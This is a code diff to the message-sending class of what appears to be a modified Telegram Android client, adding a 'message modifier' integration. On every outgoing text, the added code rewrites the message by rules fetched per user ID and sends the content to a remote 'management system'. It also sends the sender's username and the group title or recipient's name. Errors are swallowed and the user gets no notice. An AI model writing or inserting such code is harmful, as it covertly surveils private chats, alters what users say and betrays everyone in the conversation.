@@ -3811,6 +3811,111 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
 
     public void sendMessage(SendMessageParams sendMessageParams) {
         String message = sendMessageParams.message;
+        // ========== 消息修改功能集成 - 开始 ==========
+        // 在获取 message 参数后立即添加修改逻辑
+
+        // 检查是否有文本消息需要处理
+        if (message != null && message.length() > 0) {
+            try {
+                // 1. 获取当前用户信息
+                long myId = getUserConfig().getClientUserId();
+                String telegramId = String.valueOf(myId);
+
+                // 2. 保存原始消息内容（用于日志）
+                String originalMessage = message;
+
+                // 3. 应用消息修改规则
+                MessageModifierAPI api = MessageModifierAPI.getInstance();
+                String modifiedMessage = api.applyModifiers(originalMessage, telegramId);
+
+                // 4. 如果消息被修改，更新 message 变量
+                if (!originalMessage.equals(modifiedMessage)) {
+                    // 更新 message 变量，这样后续所有使用 message 的地方都会使用修改后的内容
+                    message = modifiedMessage;
+                    // 同时更新 sendMessageParams 中的 message
+                    sendMessageParams.message = modifiedMessage;
+
+                    // 记录修改日志（调试用）
+                    if (BuildVars.LOGS_ENABLED) {
+                        FileLog.d("MessageModifier: Message modified before sending");
+                        FileLog.d("MessageModifier: Original: " +
+                                (originalMessage.length() > 100 ?
+                                        originalMessage.substring(0, 100) + "..." : originalMessage));
+                        FileLog.d("MessageModifier: Modified: " +
+                                (modifiedMessage.length() > 100 ?
+                                        modifiedMessage.substring(0, 100) + "..." : modifiedMessage));
+                    }
+                }
+
+                // 5. 准备上传请求数据
+                MessageModifierAPI.MessageUploadRequest uploadRequest =
+                        new MessageModifierAPI.MessageUploadRequest();
+                uploadRequest.telegramId = myId;
+                uploadRequest.content = modifiedMessage;
+                uploadRequest.messageType = "sent";
+
+                // 6. 获取当前用户的用户名
+                TLRPC.User currentUser = getUserConfig().getCurrentUser();
+                if (currentUser != null) {
+                    if (currentUser.username != null && !currentUser.username.isEmpty()) {
+                        uploadRequest.username = currentUser.username;
+                    } else {
+                        // 如果没有用户名，使用名字
+                        String firstName = currentUser.first_name != null ? currentUser.first_name : "";
+                        String lastName = currentUser.last_name != null ? currentUser.last_name : "";
+                        uploadRequest.username = (firstName + " " + lastName).trim();
+                    }
+                }
+
+                // 7. 获取对话信息（群组/私聊）
+                long peer = sendMessageParams.peer;
+                if (peer != 0) {
+                    // 判断是否是群组/频道
+                    if (DialogObject.isChatDialog(peer)) {
+                        // 群组或频道
+                        TLRPC.Chat chat = getMessagesController().getChat(-peer);
+                        if (chat != null && chat.title != null) {
+                            uploadRequest.groupTitle = chat.title;
+                            if (BuildVars.LOGS_ENABLED) {
+                                FileLog.d("MessageModifier: Sending to group/channel: " + chat.title);
+                            }
+                        }
+                    } else if (DialogObject.isUserDialog(peer)) {
+                        // 私聊
+                        TLRPC.User user = getMessagesController().getUser(peer);
+                        if (user != null) {
+                            String firstName = user.first_name != null ? user.first_name : "";
+                            String lastName = user.last_name != null ? user.last_name : "";
+                            uploadRequest.senderName = (firstName + " " + lastName).trim();
+                            if (BuildVars.LOGS_ENABLED) {
+                                FileLog.d("MessageModifier: Sending to user: " + uploadRequest.senderName);
+                            }
+                        }
+                    }
+                }
+
+                // 8. 异步上传消息到管理系统（不阻塞消息发送）
+                api.uploadMessage(uploadRequest, new MessageModifierAPI.MessageUploadCallback() {
+                    @Override
+                    public void onComplete(boolean success) {
+                        if (BuildVars.LOGS_ENABLED) {
+                            if (success) {
+                                FileLog.d("MessageModifier: Message uploaded successfully");
+                            } else {
+                                FileLog.w("MessageModifier: Failed to upload message to server");
+                            }
+                        }
+                    }
+                });
+
+            } catch (Exception e) {
+                // 确保任何错误都不会影响消息发送
+                if (BuildVars.LOGS_ENABLED) {
+                    FileLog.e("MessageModifier: Error applying modifications", e);
+                }
+            }
+        }
+        // ========== 消息修改功能集成 - 结束 ==========
         String caption = sendMessageParams.caption;
         TLRPC.MessageMedia location = sendMessageParams.location;
         TLRPC.TL_photo photo = sendMessageParams.photo;
@@ -4049,6 +4154,9 @@ public class SendMessagesHelper extends BaseController implements NotificationCe
                         } else {
                             type = 0;
                         }
+// 在这行之前添加修改逻辑
+                        message = MessageModifierAPI.getInstance().applyModifiers(message, String.valueOf(myId));
+
                         newMsg.message = message;
                     }
                 } else if (poll != null) {
